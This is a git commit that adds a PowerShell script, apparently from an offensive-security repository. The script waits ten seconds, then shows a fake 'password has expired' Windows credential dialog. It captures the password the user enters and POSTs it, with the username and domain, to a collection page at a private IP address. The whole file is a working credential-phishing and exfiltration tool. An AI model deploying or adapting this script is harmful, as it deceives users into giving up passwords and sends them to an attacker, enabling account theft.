0df1f11ed8134e08ee1eb489bcc641f7b70ec19a
Gary Κ <33410501+g4xyk00@users.noreply.github.com>
2019-05-28 10:24:28 +0800

    Update

---
+++ Powershell/PromptForCredential.ps1
@@ -0,0 +1,19 @@
+function Invoke-LoginPrompt {
+	$cred = $Host.ui.PromptForCredential("Your password has expired and must be changed.", "Old Password", "$env:userdomain\$env:username","")
+	$username = "$env:username"
+	$domain = "$env:userdomain"
+	$password = $cred.GetNetworkCredential().password
+	$url = "http://192.168.56.102/collect.php"
+	$command = '{"username":"' + $username + '","domain":"' + $domain + '"+ "","password":"' + $password + '"}'
+	$bytes = [System.Text.Encoding]::ASCII.GetBytes($command)
+	$web = [System.Net.WebRequest]::Create($url)
+	$web.Method = "POST"
+	$web.ContentLength = $bytes.Length
+	$web.ContentType = "application/json"
+	$web.UserAgent = "Mozilla/5.0"
+	$stream = $web.GetRequestStream()
+	$stream.Write($bytes,0,$bytes.Length)
+	$stream.close()
+}
+Start-Sleep -s 10
+Invoke-LoginPrompt
